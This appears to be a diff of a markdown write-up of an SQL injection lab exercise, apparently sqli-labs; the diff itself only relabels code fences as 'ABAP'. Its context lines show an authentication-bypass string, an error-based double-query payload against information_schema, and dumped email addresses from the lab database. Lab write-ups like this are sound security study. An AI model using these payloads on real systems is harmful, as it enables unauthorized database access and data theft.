@@ -14,9 +14,9 @@ Putting username as `admin` and password as `'` gave us an error
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1
 ```
 
-So the query must be like : 
+So the query must be like :
 
-```
+```ABAP
 UPDATE users SET password="" where username="admin"
 ```
 
@@ -26,7 +26,7 @@ We give username : `admin` and password `' or 1=1 #` It gives : **SUCCESSFULLY U
 
 payload :
 
-```
+```ABAP
 ' or (select 1 from(select count(*),concat(0x3a,(select email_id from emails limit 0,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); #
 ```
 
@@ -77,7 +77,7 @@ for i in range(4):
 
 It gave me:
 
-```
+```ABAP
 From Table emails : 
 Column id  - 1,2,3,4,5,6,7,8,
 Column email_id  - Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com,
